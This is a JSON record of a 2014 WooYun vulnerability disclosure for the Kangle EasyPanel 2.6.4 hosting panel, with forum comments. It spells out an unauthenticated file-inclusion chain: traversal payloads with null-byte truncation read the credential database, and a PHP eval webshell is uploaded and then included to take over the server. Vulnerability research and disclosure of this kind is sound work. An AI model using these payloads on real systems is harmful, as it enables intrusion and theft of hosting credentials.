{"id": 2816, "wybug_id": "wooyun-2014-058173", "wybug_title": "Kangle虚拟主机最新版GetShell漏洞（无需登录即可获取所有用户信息）", "wybug_corp": "kanglesoft.com", "wybug_author": "xfkxfk", "wybug_date": "2014-04-23 15:14", "wybug_open_date": "2014-07-23 18:34", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含漏洞", "文件包含漏洞利用技巧", "文件包含", "文件包含漏洞利用", "本地文件包含利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： EasyPanel官方最新版2.6.4（4-18日更新），上一个版本2.6.3（3-28日更新）都存在无需登录可直接获取shell高危漏洞。上个漏洞 http://www.wooyun.org/bugs/wooyun-2014-054757 拿了精华，这个可以吧？ 详细说明：  在之前有这样一个漏洞： WooYun: kangle web server目录遍历可getshell 这里虽然也能拿到shell，但是首先的通过各种方法那大一个空间账号才行。所以有门槛，而且在新版2.6.4里面这个漏洞已经修复了。这里不存在门槛了。EasyPanel官方最新版（4-18日更新），其在网站控制面板登陆时，没有很好的处理用户传入的参数值，导致攻击者可以包含服务器上任意文件读取敏感文件内容，进一步登陆系统，然后包含可执行文件导致代码执行，最终直接获取系统控制权。官方现在最新版2.6.4存在此漏洞，再上一个版本2.6.3已经发现漏洞，但是官方发出的最新版还是没有修复，漏洞依然存在。这是框架问题，整个系统在加载功能模块时的c参数都存在漏洞。下面拿2.6.4的版本进行测试。   漏洞证明：  测试环境：kangle-3.3.9.msi，ep-2.6.4.exe（官方4-18日更新），windows XP首先安装kangle server，然后安装easypanel，安装成功后访问http://127.0.0.1:3312/，会自动跳转到http://127.0.0.1:3312/vhost/?c=session&a=loginForm。然后随便输入用户名密码登陆，如图发送的请求：\n\n然后修改请求url中的参数c的值，将session改为：C=../../../../../../../../../../../windows/system.ini%00..（注意：这里必须有%00进行截断。）发送修改后的请求将成功包含服务器上的/windows/system.ini文件，如下图所示：\n\n漏洞利用：前提：此系统是用来管理虚拟主机的，安装完成后，会有默认的管理员控制面板：http://127.0.0.1:3312/admin/?c=session&a=loginForm。他的主要功能就是在这里面可以添加很多网站进行统一管理，所以我们的利用前提就是这个系统里面已经有了很多网站。假设管理员已经在此系统上添加了两个网站，攻击者并不知道这两个网站，如下图：\n\n下面开始攻击利用：第一步，包含此系统的配置文件，如这里我们包含db文件：/Program Files/Bangteng/Kangle/etc/vhs.db（假设是windows系统的默认安装路径）发送构造好的请求：http://127.0.0.1:3312/vhost/index.php?c=../../../../../../../../../../../Program Files/Bangteng/Kangle/etc/vhs.db%00..&a=login包含的内容如图所示：\n\n从返回的内容中看到，这里正好是vhost的相关信息：123456e10adc3949ba59abbe56e057f20f883e/home/ftp/1/123456a1000aaaaaa0b4e7a0e5fe84ad35fb5f95b9ceeac79C:/home/ftp/a/aaaaaaa1001内容为：Vhost用户名+Vhost密码+Vhost-FTP路径+uid第二步，既然拿到了Vhost用户名和Vhost密码，然后来登陆Vhost：http://127.0.0.1:3312/vhost/?c=session&a=loginForm拿123456e10adc3949ba59abbe56e057f20f883e/home/ftp/1/123456a1000为例，这里的Vhost用户名和Vhost密码分别为：123456/123456.第三步，利用在线文件功能，上传文件，如图：\n\n我们这里上传一个php文件，内容为：<?php @eval($_POST['cmd']);phpinfo();?>，php一句话。第四步，利用第一步包含到的信息：123456e10adc3949ba59abbe56e057f20f883e/home/ftp/1/123456a1000，我们知道上传的test.php文件在/home/ftp/1/12345/目录下，然后构造请求，包含此文件，如图：\n\n返回内容显示成功包含。\n\n成功拿webshell，控制网站服务器。   修复方案：  代码加密的，猜测是在加载模版时没有对用户输入进行控制，导致包含了。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-23 18:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-23 15:18 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-04-23 16:21 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  good    \n     2014-04-23 16:40 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  怎么前两天在360看到了，也是easypanel2.6.4修复以后继续getshell，难道是我眼花了？    \n     2014-04-23 16:45 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  附图一张。。。求细节http://weibo.com/2270848820/B0VVP3Yb4?ref=    \n     2014-04-23 19:00 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  @phith0n 现在都习惯了 好不，提交数字在提交乌云 很多都玩这种 有可能拿两份钱呢！    \n     2014-04-23 21:15 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  神奇的路人甲    \n     2014-04-23 22:29 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @疯子 你知道你这么说  被360看见  他的奖金就没了的说你知道么    \n     2014-04-23 23:43 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @淡漠天空 不一定是重复提交。。。有可能是洞主见360发了，就去研究一下，一下也找到了    \n     2014-04-29 12:09 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @淡漠天空 @phith0n 这年头都不关注漏洞技术本身。。只关注奖金的了？    \n     2014-08-07 12:28 |    \t\t北洋贱队 \t\t\t( 普通白帽子  |\t\t\t        Rank:252 漏洞数:25        )\t\t \n  怎么还是../的问题  官方不长记性    \n     2014-10-08 12:40 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  话说洞主是怎么找到包含的？    \n     2015-06-06 20:47 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  好东西~~学习咯    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}